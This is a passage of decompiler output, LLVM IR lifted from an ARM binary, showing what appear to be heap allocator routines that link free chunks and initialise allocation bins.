  uselistorder label %dec_label_pc_124ac, { 1, 2, 0, 3 }
}

define i32 @function_124bc() local_unnamed_addr {
dec_label_pc_124bc:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_124bc = load i32, i32* @r4, align 4
  store i32 %v3_124bc, i32* %stack_var_-36, align 4
  %v0_124c0 = load i32, i32* @r0, align 4
  %v1_124c0 = inttoptr i32 %v0_124c0 to i32*
  %v2_124c0 = load i32, i32* %v1_124c0, align 4
  store i32 %v2_124c0, i32* %r3.global-to-local, align 4
  %v2_124c4 = icmp eq i32 %v2_124c0, 0
  store i32 %v0_124c0, i32* @r4, align 4
  br i1 %v2_124c4, label %dec_label_pc_125fc.preheader, label %dec_label_pc_124d8

dec_label_pc_125fc.preheader:                     ; preds = %dec_label_pc_124bc
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1260425 = add i32 %v0_124c0, 52
  store i32 %v1_1260425, i32* %r3.global-to-local, align 4
  %v2_1260c26 = add i32 %v0_124c0, 60
  %v3_1260c27 = inttoptr i32 %v2_1260c26 to i32*
  store i32 %v1_1260425, i32* %v3_1260c27, align 4
  %v0_1261028 = load i32, i32* %r3.global-to-local, align 4
  %v2_1261029 = add i32 %v0_1261028, 12
  %v3_1261030 = inttoptr i32 %v2_1261029 to i32*
  store i32 %v0_1261028, i32* %v3_1261030, align 4
  br label %dec_label_pc_125fc.dec_label_pc_125fc_crit_edge

dec_label_pc_124d8:                               ; preds = %dec_label_pc_124bc
  %v1_124d8 = and i32 %v2_124c0, -3
  %v3_124dc = udiv i32 %v2_124c0, 8
  store i32 %v3_124dc, i32* %r2.global-to-local, align 4
  store i32 %v1_124d8, i32* %v1_124c0, align 4
  %v0_124e4 = load i32, i32* @r0, align 4
  %v1_124e4 = add i32 %v0_124e4, -4
  store i32 %v1_124e4, i32* %r3.global-to-local, align 4
  %v1_124e8 = load i32, i32* %r2.global-to-local, align 4
  %v4_124e8 = mul i32 %v1_124e8, 4
  %v5_124e8 = add i32 %v4_124e8, %v1_124e4
  store i32 %v5_124e8, i32* %sb.global-to-local, align 4
  %v1_124ec = add i32 %v0_124e4, 52
  store i32 %v1_124ec, i32* %r7.global-to-local, align 4
  %v1_124f0 = add i32 %v0_124e4, 4
  store i32 %v1_124f0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_124f8

dec_label_pc_124f8:                               ; preds = %dec_label_pc_125f4, %dec_label_pc_124d8
  %v1_125ec10 = phi i32 [ %v1_125ec, %dec_label_pc_125f4 ], [ %v5_124e8, %dec_label_pc_124d8 ]
  %v1_12504 = phi i32 [ %v1_125f4, %dec_label_pc_125f4 ], [ %v1_124f0, %dec_label_pc_124d8 ]
  %v1_124f8 = inttoptr i32 %v1_12504 to i32*
  %v2_124f8 = load i32, i32* %v1_124f8, align 4
  store i32 %v2_124f8, i32* %r1.global-to-local, align 4
  %v2_124fc = icmp eq i32 %v2_124f8, 0
  br i1 %v2_124fc, label %dec_label_pc_125ec, label %dec_label_pc_12504

dec_label_pc_12504:                               ; preds = %dec_label_pc_124f8
  %v0_12504 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12504, i32* %v1_124f8, align 4
  %v0_12508.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12508

dec_label_pc_12508:                               ; preds = %dec_label_pc_125e0, %dec_label_pc_12504
  %v0_12524 = phi i32 [ %v0_125e0, %dec_label_pc_125e0 ], [ %v0_12508.pre, %dec_label_pc_12504 ]
  %v1_12508 = add i32 %v0_12524, 4
  %v2_12508 = inttoptr i32 %v1_12508 to i32*
  %v3_12508 = load i32, i32* %v2_12508, align 4
  store i32 %v3_12508, i32* %r3.global-to-local, align 4
  %v1_1250c = and i32 %v3_12508, -2
  store i32 %v1_1250c, i32* %lr.global-to-local, align 4
  %v2_12510 = add i32 %v1_1250c, %v0_12524
  store i32 %v2_12510, i32* @r0, align 4
  %v1_12514 = urem i32 %v3_12508, 2
  %v2_12514 = icmp eq i32 %v1_12514, 0
  %v1_12518 = add i32 %v0_12524, 8
  %v2_12518 = inttoptr i32 %v1_12518 to i32*
  %v3_12518 = load i32, i32* %v2_12518, align 4
  store i32 %v3_12518, i32* %sl.global-to-local, align 4
  %v1_1251c = add i32 %v2_12510, 4
  %v2_1251c = inttoptr i32 %v1_1251c to i32*
  %v3_1251c = load i32, i32* %v2_1251c, align 4
  store i32 %v3_1251c, i32* %r8.global-to-local, align 4
  br i1 %v2_12514, label %dec_label_pc_12524, label %dec_label_pc_12558

dec_label_pc_12524:                               ; preds = %dec_label_pc_12508
  %v1_12524 = inttoptr i32 %v0_12524 to i32*
  %v2_12524 = load i32, i32* %v1_12524, align 4
  store i32 %v2_12524, i32* %r5.global-to-local, align 4
  %v2_12528 = sub i32 %v0_12524, %v2_12524
  store i32 %v2_12528, i32* %r3.global-to-local, align 4
  %v1_1252c = add i32 %v2_12528, 8
  %v2_1252c = inttoptr i32 %v1_1252c to i32*
  %v3_1252c = load i32, i32* %v2_1252c, align 4
  store i32 %v3_1252c, i32* %ip.global-to-local, align 4
  %v1_12530 = add i32 %v3_1252c, 12
  %v2_12530 = inttoptr i32 %v1_12530 to i32*
  %v3_12530 = load i32, i32* %v2_12530, align 4
  store i32 %v3_12530, i32* %r1.global-to-local, align 4
  %v9_12534 = icmp eq i32 %v3_12530, %v2_12528
  %v1_12538 = add i32 %v2_12528, 12
  %v2_12538 = inttoptr i32 %v1_12538 to i32*
  %v3_12538 = load i32, i32* %v2_12538, align 4
  store i32 %v3_12538, i32* %r2.global-to-local, align 4
  br i1 %v9_12534, label %dec_label_pc_12540, label %dec_label_pc_1259c

dec_label_pc_12540:                               ; preds = %dec_label_pc_12524
  %v1_12540 = add i32 %v3_12538, 8
  %v2_12540 = inttoptr i32 %v1_12540 to i32*
  %v3_12540 = load i32, i32* %v2_12540, align 4
  store i32 %v3_12540, i32* %r3.global-to-local, align 4
  %v9_12544 = icmp eq i32 %v3_12540, %v2_12528
  br i1 %v9_12544, label %dec_label_pc_1254c, label %dec_label_pc_1259c

dec_label_pc_1254c:                               ; preds = %dec_label_pc_12540
  store i32 %v3_1252c, i32* %v2_12540, align 4
  %v0_12550 = load i32, i32* %r2.global-to-local, align 4
  %v1_12550 = load i32, i32* %ip.global-to-local, align 4
  %v2_12550 = add i32 %v1_12550, 12
  %v3_12550 = inttoptr i32 %v2_12550 to i32*
  store i32 %v0_12550, i32* %v3_12550, align 4
  %v0_12554 = load i32, i32* %lr.global-to-local, align 4
  %v1_12554 = load i32, i32* %r5.global-to-local, align 4
  %v2_12554 = add i32 %v1_12554, %v0_12554
  store i32 %v2_12554, i32* %lr.global-to-local, align 4
  %v0_1255c.pre = load i32, i32* @r0, align 4
  %v0_12560.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12558

dec_label_pc_12558:                               ; preds = %dec_label_pc_12508, %dec_label_pc_1254c
  %v0_125d0 = phi i32 [ %v1_1250c, %dec_label_pc_12508 ], [ %v2_12554, %dec_label_pc_1254c ]
  %v0_12560 = phi i32 [ %v3_1251c, %dec_label_pc_12508 ], [ %v0_12560.pre, %dec_label_pc_1254c ]
  %v1_12574 = phi i32 [ %v2_12510, %dec_label_pc_12508 ], [ %v0_1255c.pre, %dec_label_pc_1254c ]
  %v0_12558 = load i32, i32* @r4, align 4
  %v1_12558 = add i32 %v0_12558, 44
  %v2_12558 = inttoptr i32 %v1_12558 to i32*
  %v3_12558 = load i32, i32* %v2_12558, align 4
  store i32 %v3_12558, i32* %r3.global-to-local, align 4
  %v9_1255c = icmp eq i32 %v1_12574, %v3_12558
  %v1_12560 = and i32 %v0_12560, -4
  store i32 %v1_12560, i32* %r5.global-to-local, align 4
  br i1 %v9_1255c, label %dec_label_pc_125d0, label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %dec_label_pc_12558
  %v2_12568 = add i32 %v1_12574, %v1_12560
  store i32 %v2_12568, i32* %r3.global-to-local, align 4
  %v1_1256c = add i32 %v2_12568, 4
  %v2_1256c = inttoptr i32 %v1_1256c to i32*
  %v3_1256c = load i32, i32* %v2_1256c, align 4
  store i32 %v3_1256c, i32* %r3.global-to-local, align 4
  %v1_12570 = urem i32 %v3_1256c, 2
  %v2_12570 = icmp eq i32 %v1_12570, 0
  %v2_12574 = add i32 %v1_12574, 4
  %v3_12574 = inttoptr i32 %v2_12574 to i32*
  store i32 %v1_12560, i32* %v3_12574, align 4
  br i1 %v2_12570, label %dec_label_pc_1257c, label %dec_label_pc_12568.dec_label_pc_125ac_crit_edge

dec_label_pc_12568.dec_label_pc_125ac_crit_edge:  ; preds = %dec_label_pc_12568
  %v0_125b0.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_125ac

dec_label_pc_1257c:                               ; preds = %dec_label_pc_12568
  %v0_1257c = load i32, i32* @r0, align 4
  %v1_1257c = add i32 %v0_1257c, 8
  %v2_1257c = inttoptr i32 %v1_1257c to i32*
  %v3_1257c = load i32, i32* %v2_1257c, align 4
  store i32 %v3_1257c, i32* %ip.global-to-local, align 4
  %v1_12580 = add i32 %v3_1257c, 12
  %v2_12580 = inttoptr i32 %v1_12580 to i32*
  %v3_12580 = load i32, i32* %v2_12580, align 4
  store i32 %v3_12580, i32* %r3.global-to-local, align 4
  %v9_12584 = icmp eq i32 %v3_12580, %v0_1257c
  %v1_12588 = add i32 %v0_1257c, 12
  %v2_12588 = inttoptr i32 %v1_12588 to i32*
  %v3_12588 = load i32, i32* %v2_12588, align 4
  store i32 %v3_12588, i32* %r2.global-to-local, align 4
  br i1 %v9_12584, label %dec_label_pc_12590, label %dec_label_pc_1259c

dec_label_pc_12590:                               ; preds = %dec_label_pc_1257c
  %v1_12590 = add i32 %v3_12588, 8
  %v2_12590 = inttoptr i32 %v1_12590 to i32*
  %v3_12590 = load i32, i32* %v2_12590, align 4
  store i32 %v3_12590, i32* %r3.global-to-local, align 4
  %v9_12594 = icmp eq i32 %v3_12590, %v0_1257c
  br i1 %v9_12594, label %dec_label_pc_125a0, label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %dec_label_pc_1257c, %dec_label_pc_12540, %dec_label_pc_12524, %dec_label_pc_12590
  %v0_1259c = call i32 @function_128ec()
  store i32 %v0_1259c, i32* @r0, align 4
  %v0_125a0.pre = load i32, i32* @ip, align 4
  %v1_125a0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_125a0

dec_label_pc_125a0:                               ; preds = %dec_label_pc_12590, %dec_label_pc_1259c
  %v1_125a0 = phi i32 [ %v3_12588, %dec_label_pc_12590 ], [ %v1_125a0.pre, %dec_label_pc_1259c ]
  %v0_125a0 = phi i32 [ %v3_1257c, %dec_label_pc_12590 ], [ %v0_125a0.pre, %dec_label_pc_1259c ]
  %v2_125a0 = add i32 %v1_125a0, 8
  %v3_125a0 = inttoptr i32 %v2_125a0 to i32*
  store i32 %v0_125a0, i32* %v3_125a0, align 4
  %v0_125a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_125a4 = load i32, i32* %ip.global-to-local, align 4
  %v2_125a4 = add i32 %v1_125a4, 12
  %v3_125a4 = inttoptr i32 %v2_125a4 to i32*
  store i32 %v0_125a4, i32* %v3_125a4, align 4
  %v0_125a8 = load i32, i32* %lr.global-to-local, align 4
  %v1_125a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_125a8 = add i32 %v1_125a8, %v0_125a8
  store i32 %v2_125a8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_125ac

dec_label_pc_125ac:                               ; preds = %dec_label_pc_12568.dec_label_pc_125ac_crit_edge, %dec_label_pc_125a0
  %v0_125b0 = phi i32 [ %v0_125b0.pre, %dec_label_pc_12568.dec_label_pc_125ac_crit_edge ], [ %v2_125a8, %dec_label_pc_125a0 ]
  %v0_125ac = load i32, i32* %r7.global-to-local, align 4
  %v1_125ac = add i32 %v0_125ac, 8
  %v2_125ac = inttoptr i32 %v1_125ac to i32*
  %v3_125ac = load i32, i32* %v2_125ac, align 4
  store i32 %v3_125ac, i32* %r2.global-to-local, align 4
  %v1_125b0 = or i32 %v0_125b0, 1
  store i32 %v1_125b0, i32* %r3.global-to-local, align 4
  %v0_125b4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_125b4, i32* %v2_125ac, align 4
  %v0_125b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_125b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_125b8 = add i32 %v1_125b8, 12
  %v3_125b8 = inttoptr i32 %v2_125b8 to i32*
  store i32 %v0_125b8, i32* %v3_125b8, align 4
  %v0_125bc = load i32, i32* %lr.global-to-local, align 4
  %v1_125bc = load i32, i32* %r1.global-to-local, align 4
  %v3_125bc = add i32 %v1_125bc, %v0_125bc
  %v4_125bc = inttoptr i32 %v3_125bc to i32*
  store i32 %v0_125bc, i32* %v4_125bc, align 4
  %v0_125c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_125c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_125c0 = add i32 %v1_125c0, 4
  %v3_125c0 = inttoptr i32 %v2_125c0 to i32*
  store i32 %v0_125c0, i32* %v3_125c0, align 4
  %v0_125c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_125c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_125c4 = add i32 %v1_125c4, 8
  %v3_125c4 = inttoptr i32 %v2_125c4 to i32*
  store i32 %v0_125c4, i32* %v3_125c4, align 4
  %v0_125c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_125c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_125c8 = add i32 %v1_125c8, 12
  %v3_125c8 = inttoptr i32 %v2_125c8 to i32*
  store i32 %v0_125c8, i32* %v3_125c8, align 4
  br label %dec_label_pc_125e0

dec_label_pc_125d0:                               ; preds = %dec_label_pc_12558
  %v2_125d0 = add i32 %v1_12560, %v0_125d0
  %v1_125d4 = or i32 %v2_125d0, 1
  store i32 %v1_125d4, i32* %r3.global-to-local, align 4
  %v1_125d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_125d8 = add i32 %v1_125d8, 4
  %v3_125d8 = inttoptr i32 %v2_125d8 to i32*
  store i32 %v1_125d4, i32* %v3_125d8, align 4
  %v0_125dc = load i32, i32* %r1.global-to-local, align 4
  %v1_125dc = load i32, i32* @r4, align 4
  %v2_125dc = add i32 %v1_125dc, 44
  %v3_125dc = inttoptr i32 %v2_125dc to i32*
  store i32 %v0_125dc, i32* %v3_125dc, align 4
  br label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125ac, %dec_label_pc_125d0
  %v0_125e0 = load i32, i32* %sl.global-to-local, align 4
  %v2_125e0 = icmp eq i32 %v0_125e0, 0
  store i32 %v0_125e0, i32* %r1.global-to-local, align 4
  br i1 %v2_125e0, label %dec_label_pc_125ec.loopexit, label %dec_label_pc_12508

dec_label_pc_125ec.loopexit:                      ; preds = %dec_label_pc_125e0
  %v0_125ec.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_125ec.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_125ec

dec_label_pc_125ec:                               ; preds = %dec_label_pc_125ec.loopexit, %dec_label_pc_124f8
  %v1_125ec = phi i32 [ %v1_125ec.pre, %dec_label_pc_125ec.loopexit ], [ %v1_125ec10, %dec_label_pc_124f8 ]
  %v0_125f4 = phi i32 [ %v0_125ec.pre, %dec_label_pc_125ec.loopexit ], [ %v1_12504, %dec_label_pc_124f8 ]
  %v9_125ec = icmp eq i32 %v0_125f4, %v1_125ec
  br i1 %v9_125ec, label %dec_label_pc_12664, label %dec_label_pc_125f4

dec_label_pc_125f4:                               ; preds = %dec_label_pc_125ec
  %v1_125f4 = add i32 %v0_125f4, 4
  store i32 %v1_125f4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_124f8

dec_label_pc_125fc.dec_label_pc_125fc_crit_edge:  ; preds = %dec_label_pc_125fc.preheader, %dec_label_pc_125fc.dec_label_pc_125fc_crit_edge
  %v0_125fc.pre = load i32, i32* @r4, align 4
  %v1_125fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_125fc = mul i32 %v1_125fc.pre, 8
  %v5_125fc = add i32 %v4_125fc, %v0_125fc.pre
  %v1_12600 = add i32 %v1_125fc.pre, 1
  store i32 %v1_12600, i32* %r2.global-to-local, align 4
  %v1_12604 = add i32 %v5_125fc, 44
  store i32 %v1_12604, i32* %r3.global-to-local, align 4
  %v2_1260c = add i32 %v5_125fc, 52
  %v3_1260c = inttoptr i32 %v2_1260c to i32*
  store i32 %v1_12604, i32* %v3_1260c, align 4
  %v0_12610 = load i32, i32* %r3.global-to-local, align 4
  %v2_12610 = add i32 %v0_12610, 12
  %v3_12610 = inttoptr i32 %v2_12610 to i32*
  store i32 %v0_12610, i32* %v3_12610, align 4
  %v7_12614 = icmp sgt i32 %v1_12600, 95
  br i1 %v7_12614, label %dec_label_pc_12618, label %dec_label_pc_125fc.dec_label_pc_125fc_crit_edge

dec_label_pc_12618:                               ; preds = %dec_label_pc_125fc.dec_label_pc_125fc_crit_edge
  %v0_12618 = load i32, i32* @r4, align 4
  %v1_12618 = inttoptr i32 %v0_12618 to i32*
  %v2_12618 = load i32, i32* %v1_12618, align 4
  store i32 %v2_12618, i32* %r2.global-to-local, align 4
  %v1_1261c = add i32 %v0_12618, 864
  %v2_1261c = inttoptr i32 %v1_1261c to i32*
  %v3_1261c = load i32, i32* %v2_1261c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12624 = urem i32 %v2_12618, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_1262c = or i32 %v3_1261c, 1
  store i32 %v1_1262c, i32* %r1.global-to-local, align 4
  %v1_12630 = or i32 %v1_12624, 72
  store i32 %v1_12630, i32* %r2.global-to-local, align 4
  %v1_12634 = add i32 %v0_12618, 52
  store i32 %v1_12634, i32* %ip.global-to-local, align 4
  %v2_12638 = add i32 %v0_12618, 840
  %v3_12638 = inttoptr i32 %v2_12638 to i32*
  store i32 0, i32* %v3_12638, align 4
  %v0_1263c = load i32, i32* %r3.global-to-local, align 4
  %v1_1263c = add i32 %v0_1263c, 65536
  store i32 %v1_1263c, i32* %r3.global-to-local, align 4
  %v0_12640 = load i32, i32* %r0.global-to-local, align 4
  %v1_12640 = load i32, i32* @r4, align 4
  %v2_12640 = add i32 %v1_12640, 836
  %v3_12640 = inttoptr i32 %v2_12640 to i32*
  store i32 %v0_12640, i32* %v3_12640, align 4
  %v0_12644 = load i32, i32* %r0.global-to-local, align 4
  %v1_12644 = load i32, i32* @r4, align 4
  %v2_12644 = add i32 %v1_12644, 844
  %v3_12644 = inttoptr i32 %v2_12644 to i32*
  store i32 %v0_12644, i32* %v3_12644, align 4
  %v1_12648 = load i32, i32* @r4, align 4
  %v2_12648 = add i32 %v1_12648, 852
  %v3_12648 = inttoptr i32 %v2_12648 to i32*
  store i32 %v1_1263c, i32* %v3_12648, align 4
  %v1_1264c = load i32, i32* @r4, align 4
  %v2_1264c = add i32 %v1_1264c, 864
  %v3_1264c = inttoptr i32 %v2_1264c to i32*
  store i32 %v1_1262c, i32* %v3_1264c, align 4
  %v1_12650 = load i32, i32* @r4, align 4
  %v2_12650 = inttoptr i32 %v1_12650 to i32*
  store i32 %v1_12630, i32* %v2_12650, align 4
  %v0_12654 = load i32, i32* %ip.global-to-local, align 4
  %v1_12654 = load i32, i32* @r4, align 4
  %v2_12654 = add i32 %v1_12654, 44
  %v3_12654 = inttoptr i32 %v2_12654 to i32*
  store i32 %v0_12654, i32* %v3_12654, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_1265c = call i32 @function_12ec0(i32 30, i32 %v1_1262c, i32 %v1_12630, i32 %v1_1263c)
  store i32 %v4_1265c, i32* @r0, align 4
  %v1_12660 = load i32, i32* @r4, align 4
  %v2_12660 = add i32 %v1_12660, 860
  %v3_12660 = inttoptr i32 %v2_12660 to i32*
  store i32 %v4_1265c, i32* %v3_12660, align 4
  br label %dec_label_pc_12664

dec_label_pc_12664:                               ; preds = %dec_label_pc_125ec, %dec_label_pc_12618
  %v2_12668 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12668, i32* @r4, align 4
  %v1_1266c = load i32, i32* @r0, align 4
  ret i32 %v1_1266c

; uselistorder directives
  uselistorder i32 %v0_12618, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12610, { 1, 0 }
  uselistorder i32 %v1_125f4, { 1, 0 }
  uselistorder i32 %v0_125e0, { 0, 2, 1 }
  uselistorder i32 %v0_125bc, { 1, 0 }
  uselistorder i32 %v1_1250c, { 1, 0, 2 }
  uselistorder i32 %v0_12524, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_124e4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 10, 0, 8, 9, 6, 7, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_12664, { 1, 0 }
  uselistorder label %dec_label_pc_125fc.dec_label_pc_125fc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_125e0, { 1, 0 }
  uselistorder label %dec_label_pc_125ac, { 1, 0 }
  uselistorder label %dec_label_pc_125a0, { 1, 0 }
  uselistorder label %dec_label_pc_1259c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12558, { 1, 0 }
}

define i32 @function_12670() local_unnamed_addr {
dec_label_pc_12670:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12670 = load i32, i32* @r4, align 4
  %v6_12670 = load i32, i32* @r5, align 4
  %v9_12670 = load i32, i32* @r6, align 4
  %v12_12670 = load i32, i32* @r7, align 4
  %v18_12670 = load i32, i32* @lr, align 4
  %v0_12678 = load i32, i32* @r0, align 4
  store i32 %v0_12678, i32* @r6, align 4
  %v2_12678 = icmp eq i32 %v0_12678, 0
  %v2_1267c = ptrtoint i32* %stack_var_-40 to i32
  store i32 124088, i32* @r7, align 4
  br i1 %v2_12678, label %dec_label_pc_12884, label %dec_label_pc_12688

dec_label_pc_12688:                               ; preds = %dec_label_pc_12670
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_1268c = load i32, i32* inttoptr (i32 124156 to i32*), align 4
  store i32 %v4_1268c, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_1268c, i32* %r2.global-to-local, align 4
  %v4_12698 = load i32, i32* inttoptr (i32 124124 to i32*), align 4
  store i32 %v4_12698, i32* %r1.global-to-local, align 4
  store i32 %v2_1267c, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_126a4 = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  store i32 %v4_126a4, i32* %ip.global-to-local, align 4
  store i32 75440, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_126a4)
  %v0_126b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_126b0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_126b8 = load i32, i32* @r7, align 4
  %v2_126b8 = add i32 %v0_126b8, 16
  %v3_126b8 = inttoptr i32 %v2_126b8 to i32*
  %v4_126b8 = load i32, i32* %v3_126b8, align 4
  store i32 %v4_126b8, i32* %ip.global-to-local, align 4
  store i32 75460, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_126b8)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_126c8 = load i32, i32* @r7, align 4
  %v2_126c8 = add i32 %v0_126c8, 32
  %v3_126c8 = inttoptr i32 %v2_126c8 to i32*
  %v4_126c8 = load i32, i32* %v3_126c8, align 4
  store i32 %v4_126c8, i32* @lr, align 4
  %v0_126cc = load i32, i32* @r6, align 4
  %v1_126cc = add i32 %v0_126cc, -4
  %v2_126cc = inttoptr i32 %v1_126cc to i32*
  %v3_126cc = load i32, i32* %v2_126cc, align 4
  store i32 %v3_126cc, i32* %r2.global-to-local, align 4
  %v1_126d0 = inttoptr i32 %v4_126c8 to i32*
  %v2_126d0 = load i32, i32* %v1_126d0, align 4
  store i32 %v2_126d0, i32* %r3.global-to-local, align 4
  %v1_126d4 = and i32 %v3_126cc, -4
  store i32 %v1_126d4, i32* %ip.global-to-local, align 4
  %v1_126d8 = add i32 %v0_126cc, -8
  store i32 %v1_126d8, i32* @r5, align 4
  store i32 %v1_126d8, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_126d4, %v2_126d0
  br i1 %tmp, label %dec_label_pc_12708, label %dec_label_pc_126e8

dec_label_pc_126e8:                               ; preds = %dec_label_pc_12688
  %v1_126e8 = or i32 %v2_126d0, 3
  store i32 %v1_126e8, i32* %r3.global-to-local, align 4
  store i32 %v1_126e8, i32* %v1_126d0, align 4
  %v3_126ec = load i32, i32* @lr, align 4
  %v4_126ec = add i32 %v3_126ec, -8
  store i32 %v4_126ec, i32* %lr.global-to-local, align 4
  %v0_126f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_126f0 = udiv i32 %v0_126f0, 8
  store i32 %v3_126f0, i32* %r1.global-to-local, align 4
  %v1_126f4 = add i32 %v3_126ec, -4
  store i32 %v1_126f4, i32* %r2.global-to-local, align 4
  %v4_126f8 = mul nuw i32 %v3_126f0, 4
  %v5_126f8 = add i32 %v4_126f8, %v1_126f4
  %v6_126f8 = inttoptr i32 %v5_126f8 to i32*
  %v7_126f8 = load i32, i32* %v6_126f8, align 4
  store i32 %v7_126f8, i32* %r3.global-to-local, align 4
  %v1_126fc = load i32, i32* @r5, align 4
  %v2_126fc = add i32 %v1_126fc, 8
  %v3_126fc = inttoptr i32 %v2_126fc to i32*
  store i32 %v7_126f8, i32* %v3_126fc, align 4
  %v0_12700 = load i32, i32* @r5, align 4
  %v1_12700 = load i32, i32* %r2.global-to-local, align 4
  %v2_12700 = load i32, i32* %r1.global-to-local, align 4
  %v5_12700 = mul i32 %v2_12700, 4
  %v6_12700 = add i32 %v5_12700, %v1_12700
  %v7_12700 = inttoptr i32 %v6_12700 to i32*
  store i32 %v0_12700, i32* %v7_12700, align 4
  br label %dec_label_pc_1286c

dec_label_pc_12708:                               ; preds = %dec_label_pc_12688
  %v1_12708 = and i32 %v3_126cc, 2
  %v2_12708 = icmp eq i32 %v1_12708, 0
  br i1 %v2_12708, label %dec_label_pc_12710, label %dec_label_pc_12844

dec_label_pc_12710:                               ; preds = %dec_label_pc_12708
  %v1_12710 = or i32 %v2_126d0, 1
  store i32 %v1_12710, i32* %r3.global-to-local, align 4
  store i32 %v1_12710, i32* %v1_126d0, align 4
  %v0_12718 = load i32, i32* @r6, align 4
  %v1_12718 = add i32 %v0_12718, -4
  %v2_12718 = inttoptr i32 %v1_12718 to i32*
  %v3_12718 = load i32, i32* %v2_12718, align 4
  store i32 %v3_12718, i32* %r3.global-to-local, align 4
  %v0_1271c = load i32, i32* @r5, align 4
  %v1_1271c = load i32, i32* %ip.global-to-local, align 4
  %v2_1271c = add i32 %v1_1271c, %v0_1271c
  store i32 %v2_1271c, i32* %lr.global-to-local, align 4
  %v1_12720 = urem i32 %v3_12718, 2
  %v2_12720 = icmp eq i32 %v1_12720, 0
  %v1_12724 = add i32 %v2_1271c, 4
  %v2_12724 = inttoptr i32 %v1_12724 to i32*
  %v3_12724 = load i32, i32* %v2_12724, align 4
  store i32 %v3_12724, i32* %r8.global-to-local, align 4
  br i1 %v2_12720, label %dec_label_pc_1272c, label %dec_label_pc_12760

dec_label_pc_1272c:                               ; preds = %dec_label_pc_12710
  %v1_1272c = add i32 %v0_12718, -8
  %v2_1272c = inttoptr i32 %v1_1272c to i32*
  %v3_1272c = load i32, i32* %v2_1272c, align 4
  store i32 %v3_1272c, i32* %r1.global-to-local, align 4
  %v2_12730 = sub i32 %v0_1271c, %v3_1272c
  store i32 %v2_12730, i32* %r3.global-to-local, align 4
  %v1_12734 = add i32 %v2_12730, 8
  %v2_12734 = inttoptr i32 %v1_12734 to i32*
  %v3_12734 = load i32, i32* %v2_12734, align 4
  store i32 %v3_12734, i32* %r2.global-to-local, align 4
  %v1_12738 = add i32 %v3_12734, 12
  %v2_12738 = inttoptr i32 %v1_12738 to i32*
  %v3_12738 = load i32, i32* %v2_12738, align 4
  store i32 %v3_12738, i32* %r4.global-to-local, align 4
